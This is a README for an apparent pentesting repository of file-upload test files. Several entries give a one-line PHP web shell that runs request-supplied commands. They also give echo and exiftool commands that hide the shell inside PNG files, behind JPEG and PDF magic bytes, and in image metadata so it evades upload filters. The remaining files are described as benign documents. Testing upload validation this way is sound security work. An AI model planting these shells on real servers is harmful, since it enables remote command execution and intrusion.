# security-test-files
Different files made help with security testing applications.

### Files

#### php-shell.php
- php file with a php shell in it
- `echo '<?php system($_REQUEST['cmd']); ?>' >> php-shell.php`

#### php-shell-added-to-end-png-magic-bytes.php
- added php shell payload to the end of png file
- `echo '<?php system($_REQUEST['cmd']); ?>' >> regular-png-file.png && mv regular-png-file.png php-shell-added-to-end-png-magic-bytes.php`

#### php-shell-directly-in-image.png
- php shell added directly to image
- `echo '<?php system($_REQUEST['cmd']); ?>' >> php-shell-directly-in-image.png`

#### php-shell-with-jpeg-magic-bytes.php
- php shell file with added jpeg magic bytes
- ffd8 ffdb

#### php-shell-with-pdf-magic-bytes.php
- php shell file with added pdf magic bytes
- 2550 4446 2d

#### php-shell-with-php-payload-in-png-comment-metadata-png-magic-bytes.php
- php shell payload inserted into png comment and changed the file to `.php`
- `exiftool -comment='<?php system($_REQUEST['cmd']); ?>' png-file-with-php-payload-in-comment-metadata.png`
- renamed png-file-with-php-payload-in-comment-metadata.png to php-shell-with-php-payload-in-png-comment-metadata-png-magic-bytes.php

#### png-file-with-php-payload-in-comment-metadata.png
- php payload added in the metadata comment section
- `exiftool -comment='<?php system($_REQUEST['cmd']); ?>' png-file-with-php-payload-in-comment-metadata.png`

#### regular-excel-document.xlsx
- nothing special, just an excel sheet with some text and `=1+1` calculation

#### regular-pdf-document.pdf
- nothing special, just a pdf file with some text

#### regular-png-file.png
- nothing special, just a png file

#### regular-text-document.txt
- nothing special, just a text document with some text

#### regular-word-document.docx
- nothing special, just a word document with some text
